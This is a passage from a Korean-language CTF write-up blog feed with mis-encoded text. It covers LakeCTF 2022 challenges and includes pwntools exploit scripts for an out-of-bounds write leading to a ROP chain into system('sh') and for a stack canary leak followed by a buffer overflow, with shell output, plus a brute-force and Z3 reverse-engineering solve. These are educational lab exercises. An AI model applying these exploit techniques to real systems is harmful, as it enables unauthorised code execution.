<code>-9223372036854749069</code> ì´ë‹¤. ì‚¬ì‹¤ì€ <code>sh</code>ì„ ì˜ë„í•œ ë¬¸ìžì—´ì´ë‹¤. ì™œ ì´ë ‡ê²Œ ì¤¬ì„ê¹Œ?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â–º 0x56310fe0d428 &lt;vuln+294&gt;    call   get_gnomed                &lt;get_gnomed&gt;</span><br><span class="line">       rdi: 0x7ffe3265c040 â€”â–¸ 0x7f4d54ba36c0 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887</span><br><span class="line">       rsi: 0x39</span><br><span class="line">       rdx: 0x39</span><br><span class="line">       rcx: 0x0</span><br></pre></td></tr></table></figure><p><code>get_gnomed</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë–„ rdiì˜ ê°’ì€ <code>0x7ffe3265c040</code>ì´ë‹¤. ì´ í•¨ìˆ˜ì—ì„œ <code>rdi</code>ë¥¼ ì“°ì§€ ì•Šê¸° ë•Œë¬¸ì— í•¨ìˆ˜ê°€ ì¢…ë£Œë  ë•Œë„ rdiê°€ ë™ì¼í•˜ë‹¤.</p><p>ê·¸ë ‡ë‹¨ ëœ»ì€ <code>system</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ ë‚´ê°€ ì›í•˜ëŠ” ë§¤ìš° ìž‘ì€ ê°’ìœ¼ë¡œ <code>rdi</code>ë¡œ ì§€ì •í•  ìˆ˜ ìžˆë‹¨ ëœ»</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ì‹œë‚˜ë¦¬ì˜¤"><a href="#ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ì‹œë‚˜ë¦¬ì˜¤"></a>ì‹œë‚˜ë¦¬ì˜¤</h3><ol><li>OOB write íŠ¸ë¦¬ê±° ìœ„í•´ <code>cnt</code> ìž…ë ¥ ì‹œ 48 ìž…ë ¥</li><li><code>_IO_2_1_stdout_</code> ì¶œë ¥í•´ì£¼ëŠ” ê²ƒì„ ì´ìš©í•˜ì—¬ libc base êµ¬í•˜ê¸°</li><li>ì •ë ¬í•  ê°’ë“¤ì„ ì ì„ ë•Œ(ìŠ¤íƒì— ê°’ì„ ì ì„ ë•Œ) <code>cnt</code>ë¥¼ ë” í° ìˆ˜ë¡œ í•˜ê¸° ìœ„í•´ ë§¨ ì²˜ìŒ 57 ìž…ë ¥ &lt;- OOB write íŠ¸ë¦¬ê±° ë¨</li><li>ìŠ¤íƒì— íŽ˜ì´ë¡œë“œ ìž…ë ¥: ret ê°€ì ¯ í•„ìš” (<code>movaps xmmword ptr [rsp + 0x50], xmm0</code>ì—ì„œ ë©ˆì¶”ê¸° ë•Œë¬¸)</li><li>ì¹´ë‚˜ë¦¬ì˜ ìœ„ì¹˜ê°€ ì œ ìœ„ì¹˜ì— ì˜¨ì „ížˆ ìžˆì„ ìˆ˜ ìžˆë„ë¡ ê¸°ë„</li></ol><p>ì—¬ë‹´ì´ì§€ë§Œ <code>ret</code> ì£¼ì†Œê°€ <code>system</code> ì£¼ì†Œë³´ë‹¤ ìž‘ê²Œ êµ¬í•´ì¡Œê¸° ë•Œë¬¸ì— ì´ê±°ì— ëŒ€í•œ í¬ê¸° ê³ ë¯¼ì€ í•˜ì§€ ì•Šì•˜ë‹¤.</p><h3 id="ê°€ì ¯-ì°¾ê¸°"><a href="#ê°€ì ¯-ì°¾ê¸°" class="headerlink" title="ê°€ì ¯ ì°¾ê¸°"></a>ê°€ì ¯ ì°¾ê¸°</h3><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ROPgadget --binary libc.so.6 | grep &quot; : ret&quot;</span><br><span class="line">0x00000000000291d6 : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.polygl0ts.ch&#x27;, 3900)</span></span><br><span class="line">e= ELF(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./ld-linux-x86-64.so.2&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sh += <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">p.send(sh * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak :: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;sort? &#x27;</span>, <span class="built_in">str</span>(<span class="number">48</span>)) <span class="comment"># it caused an oob write</span></span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x291d6</span> <span class="comment">#0x29cd6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">57</span>, ret, system] <span class="comment"># 57: sort count overwriting</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span> - <span class="built_in">len</span>(payload)):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(-<span class="number">9223372036854749069</span>)) <span class="comment"># input 0x8000000000006873</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] leak :: 0x7fb8ce4466c0</span><br><span class="line">[*] libc base :: 0x7fb8ce247000</span><br><span class="line">[57, 140431709372886, 140431709514304]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;https://www.youtube.com/watch?v=2HjspVV0jK4&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Attack on canary (canary)</title>
      <link href="/221003-lakectf2022-attack_on_canary/"/>
      <url>/221003-lakectf2022-attack_on_canary/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬, ë„ì»¤íŒŒì¼</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><p>ë¬¸ì œ ì œëª©ì— ë‚˜ì™€ìžˆë“¯ì´ ë°”ì´ë„ˆë¦¬ì— Canaryê°€ ìžˆê³  ìµìŠ¤í•˜ëŠ” ë°ì— ì´ê²ƒê³¼ ë°€ì ‘í•˜ê²Œ ê´€ë ¨ìžˆì„ ê²ƒì´ë‹¤.</p><p>ë³¼ë§Œí•œ í•¨ìˆ˜ëŠ” ë”± í•˜ë‚˜ ìžˆë‹¤. <code>vulnerable()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your command: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tell me which slot you wanna read: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf[<span class="number">8</span> * v1], <span class="number">8uLL</span>); <span class="comment">// ê¸°ëŠ¥ 1: canary leak</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me how much you wanna write: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What are the contents (max 8 bytes): &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v1); <span class="comment">// ê¸°ëŠ¥ 2: bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê¸°ëŠ¥ 1) ì›í•˜ëŠ” ì£¼ì†Œë¥¼ 8ë°”ì´íŠ¸ ì½ì„ ìˆ˜ ìžˆìŒ -&gt; canary leak<br>ê¸°ëŠ¥ 2) ì›í•˜ëŠ” ì‚¬ì´ì¦ˆë§Œí¼ ì“°ê¸° ê°€ëŠ¥í•¨ -&gt; bofë¡œ ì¸í•œ rip ë³€ê²½ ê°€ëŠ¥</p><p>ë§ˆì¹¨ win í•¨ìˆ˜ê°€ ì¡´ìž¬í•˜ë‹ˆ ì´ ìª½ìœ¼ë¡œ íë¦„ì„ ëŒë¦¬ë©´ ë  ë“¯</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ì½ì„ ìˆ˜ ìžˆê³  ì›í•˜ëŠ” ì‚¬ì´ì¦ˆ ë§Œí¼ ì“°ëŠ” ê±´ ì •ë§ ê°•ë ¥í•œ ê²ƒ ê°™ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./exe&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">6100</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = e.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna read: &#x27;</span>, <span class="built_in">str</span>(<span class="number">11</span>))</span><br><span class="line"></span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)[:<span class="number">8</span>])</span><br><span class="line">log.info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;you wanna write: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;)&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] canary :: 0x53eaf0ab9b66a00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">: Good</span><br><span class="line">Your command: $ </span><br><span class="line">$ id</span><br><span class="line">/bin/sh: 1: d: not found</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;this_is_clearly_a_fake_flag&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - baby rev (rev, z3)</title>
      <link href="/221003-lakectf2022-baby_rev/"/>
      <url>/221003-lakectf2022-baby_rev/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬, nc ì ‘ì† ì£¼ì†Œ</p><p>í‰ì†Œì— ë¦¬ë²„ì‹± ë¶„ì•¼ë¥¼ ìž˜ í’€ì§€ ì•ŠëŠ”ë°, ë­”ê°€ ì˜¤ëŠ˜ë”°ë¼ í’€ì–´ë³´ê³  ì‹¶ì–´ì„œ ì†”ë¸Œê°€ ë§Žì€ ë¦¬ë²„ì‹± í•˜ë‚˜ ì—´ì–´ë´¤ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDAë¡œ ì—´ë©´ mainí•¨ìˆ˜ê°€ ìžˆëŠ”ë° ëŒ€ì¶© í•µì‹¬ì ì¸ ë¶€ë¶„(ë°–ì— ì—†ì§€ë§Œ)ì„ ê°€ì ¸ì˜¤ë©´ ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;What&#x27;s your your number:&quot;</span>, envp);</span><br><span class="line">fflush(_bss_start);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;input);</span><br><span class="line">v3 = <span class="number">0LL</span>;</span><br><span class="line">key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( input - <span class="number">0x10000</span> &gt; <span class="number">0x7FFF0000</span> )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_4;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v5 = input &gt;&gt; v3++;</span><br><span class="line">  key = (v5 &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">0x20</span> );</span><br><span class="line"><span class="keyword">if</span> ( input == key )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">// print flag</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì‚¬ìš©ìž ìž…ë ¥ì„ ë°›ê³  ê·¸ ìž…ë ¥ì— ëŒ€í•´ â€˜ì–´ë– í•œ ì—°ì‚°â€™ì„ ì§„í–‰í•œ ê²°ê³¼(key)ì™€ ë¹„êµí•´ì„œ ë§žìœ¼ë©´ flagë¥¼ ì¶œë ¥í•´ì¤€ë‹¤.</p><p>ë¸Œë£¨íŠ¸ í¬ì‹±ì„ í•˜ë©´ ë˜ì§€ ì•Šì„ê¹Œ? ì´ ì½”ë“œë¥¼ cë¡œ ì˜®ê²¨ì„œ ë¸Œí¬í•´ë´ì•¼ê² ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o solve solve.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (input - <span class="number">0x10000</span> &lt; <span class="number">0x7fff0001</span>) &#123;</span><br><span class="line"><span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> v3 = <span class="number">0</span>; v3 &lt; <span class="number">0x20</span>; v5++) &#123;</span><br><span class="line">key = ((input &gt;&gt; v3) &amp; <span class="number">1</span>) + <span class="number">2</span> * key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input == key) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, input);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">input++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ëŸ°ì‹ìœ¼ë¡œ cë¡œ ì½”ë“œë¥¼ ì˜®ê¸°ê³  ë£¨í”„ë¥¼ ëŒë ¤ì£¼ë©´ ì•„ëž˜ì™€ ê°™ì´ <code>98304</code>ë¼ëŠ” ê°’ì´ ë‚˜ì˜¨ë‹¤. ì‚¬ì‹¤ ì´ ë¬¸ì œ ì •ë‹µì„ ì—¬ëŸ¬ê°œì¸ë° í•˜ë‚˜ë§Œ ìž…ë ¥í•˜ë©´ flagë¥¼ ë˜ì ¸ì£¼ê¸° ë•Œë¬¸ì— í•˜ë‚˜ë§Œ ì¶œë ¥í•˜ê³  ë°”ë¡œ breakë¥¼ í•´ì£¼ì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ ./solve </span><br><span class="line">98304</span><br><span class="line">jir4vvit@ubuntu:~/ctf/lake/rev-baby$ nc chall.polygl0ts.ch 3600</span><br><span class="line">What&#x27;s your your number:98304</span><br><span class="line">EPFL&#123;4ft3r_th15_h0w_h4rD_caN_r3V_8e?&#125;</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>ì´ ë¬¸ì œë¥¼ íŒŒì´ì¬ ëª¨ë“ˆì¸ <code>Z3 solver</code>ë¥¼ ì´ìš©í•˜ì—¬ í’€ ìˆ˜ë„ ìžˆë‹¤.</p><h3 id="Z3-solver"><a href="#Z3-solver" class="headerlink" title="Z3 solver"></a>Z3 solver</h3><p><code>Z3 solver</code>ëŠ” íŠ¹ì • ê°’, ì¦‰ ì •ë‹µì„ ì°¾ì•„ì£¼ëŠ” SMT solver ëª¨ë“ˆì´ë¼ê³  í•œë‹¤. (SMT: Satisfiability Modulo Theories)<br>ì–´ë– í•œ ìˆ˜ì‹ì„ ë§Œì¡±í•˜ëŠ” ê°’ì´ ì¡´ìž¬í•˜ëŠ” ì§€ ì°¾ì•„ì£¼ëŠ” ê±´ë°, ì¡´ìž¬í•œë‹¤ë©´ ê·¸ ê°’ì„ êµ¬í•´ì¤€ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x + y = 12</span><br><span class="line">x - y = 6</span><br></pre></td></tr></table></figure><p>ì˜ˆë¥¼ ë“¤ì–´, ì´ëŸ° ì—°ë¦½ë°©ì •ì‹ì´ ì¡´ìž¬í•  ë•Œ, xì™€ yì˜ ê°’ì„ <code>Z3 solver</code>ê°€ êµ¬í•´ì¤„ ìˆ˜ ìžˆë‹¤.<br>ë°”ë¡œ ì•„ëž˜ì™€ ê°™ì´..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from z3 import *</span><br><span class="line">&gt;&gt;&gt; x = Int(&#x27;x&#x27;)</span><br><span class="line">&gt;&gt;&gt; y = Int(&#x27;y&#x27;)</span><br><span class="line">&gt;&gt;&gt; solve(x+y==12,x-y==6)</span><br><span class="line">[x = 9, y = 3]</span><br></pre></td></tr></table></figure><p>ì•„ëž˜ì— ë‹¤ìš´ë¡œë“œ ë°©ë²•ê³¼ ì—¬ëŸ¬ ë§í¬ë“¤ì„ ë‚¨ê¸°ê³  Z3ë¥¼ ì´ìš©í•˜ì—¬ ì´ ë¬¸ì œë¥¼ ì–´ë–»ê²Œ í’€ ìˆ˜ ìžˆëŠ”ì§€ ì•Œì•„ë³´ìž.</p><h4 id="ë‹¤ìš´ë¡œë“œ-ë°©ë²•"><a href="#ë‹¤ìš´ë¡œë“œ-ë°©ë²•" class="headerlink" title="ë‹¤ìš´ë¡œë“œ ë°©ë²•"></a><strong>ë‹¤ìš´ë¡œë“œ ë°©ë²•</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Z3Prover/z3">ê³µì‹ github ë§í¬</a><br><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">z3py-tutorial</a></p><h3 id="solve-with-Z3"><a href="#solve-with-Z3" class="headerlink" title="solve with Z3"></a>solve with Z3</h3><p>ì¼ë‹¨. ëª¨ë“ˆì„ ê°€ì ¸ì˜¤ê³  ë³€ìˆ˜ ë‘ ê°œë¥¼ ì„ ì–¸í•´ì•¼ í•œë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#ipt = Int(&#x27;ipt&#x27;)</span></span><br><span class="line">ipt = BitVec(<span class="string">&quot;ipt&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key = Int(&#x27;key&#x27;) # key is not variable</span></span><br><span class="line">key = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>ì‹¤ìˆ˜ë“¤ì´.. ì£¼ì„ì²˜ë¦¬ë˜ì–´ ìžˆëŠ”ë°, ê°€ìž¥ ì²˜ìŒ í–ˆë˜ ì‹¤ìˆ˜ëŠ” ì‚¬ìš©ìž ì¸í’‹ì„ ê·¸ëƒ¥ <code>Int()</code>ë¡œ ì •ì˜í•œ ì 